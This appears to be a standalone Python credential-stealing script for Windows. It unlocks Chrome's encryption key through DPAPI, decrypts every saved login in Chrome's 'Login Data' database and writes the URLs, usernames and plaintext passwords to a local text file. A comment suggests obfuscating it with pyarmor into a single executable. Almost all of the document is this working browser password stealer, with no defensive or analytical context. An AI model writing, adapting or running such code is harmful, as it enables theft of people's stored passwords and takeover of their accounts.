import os
import json
import base64
import sqlite3
import shutil
import ctypes
import ctypes.wintypes
from Crypto.Cipher import AES
#pyarmor pack -e " --onefile" your_script.py

def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)

    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove DPAPI prefix.
    print(encrypted_key)
    # Define the DATA_BLOB structure
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]
    
    # Prepare the DATA_BLOB input
    blob_in = DATA_BLOB()
    blob_in.cbData = len(encrypted_key)
    blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char))
    
    blob_out = DATA_BLOB()

    # CryptUnprotectData returns a BOOL
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        decrypted_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted_key
    else:
        raise ctypes.WinError()

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        return f"Failed to decrypt: {str(e)}"

def get_chrome_login_data():
    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    
    # Create a copy of the database to work with.
    db_path = 'Login Data Copy'
    shutil.copyfile(chrome_path, db_path)

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

    key = get_encryption_key()
    login_data = []

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        
        login_data.append({
            'url': url,
            'username': username,
            'password': decrypted_password
        })

    conn.close()
    os.remove(db_path)
    
    return login_data

if __name__ == '__main__':
    login_data = get_chrome_login_data()
    s = []
    for entry in login_data:
        s.append(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
    f = open("data.txt",'w')
    for i in s:
    
        f.write(i)
    f.close()